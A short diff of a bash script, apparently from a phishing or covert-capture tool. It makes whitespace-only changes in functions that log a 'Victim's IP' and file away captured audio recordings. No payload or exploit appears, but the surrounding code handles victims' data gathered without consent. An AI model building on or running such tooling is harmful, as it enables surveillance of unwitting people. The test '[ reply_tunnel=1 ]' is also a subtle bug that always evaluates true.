@@ -481,7 +481,7 @@ capture_ip() {
         IP=$(grep -a 'IP:' .server/www/ip.txt | cut -d " " -f2 | tr -d '\r')
         IFS=$'\n'
         echo -e "\n${RED} Victim's IP : ${RED}$IP"
-				echo -e " "
+	echo -e " "
 	if [ reply_tunnel=1 ]; then
 		echo -ne "${RED} IP details cannot be captured in localhost server"
 		echo " "
@@ -614,7 +614,7 @@ capture_data_audio() {
                                 mkdir ${logs_dir}
                                 mv ${logs_dir} ${files_dir}/${site_name}/
                                 mv .server/www/*.wav "audio-${filename}.wav"
-																mv "audio-${filename}.wav"  "${logs_full_dir}"
+				mv "audio-${filename}.wav"  "${logs_full_dir}"
                         fi
                 fi
                 sleep 0.5
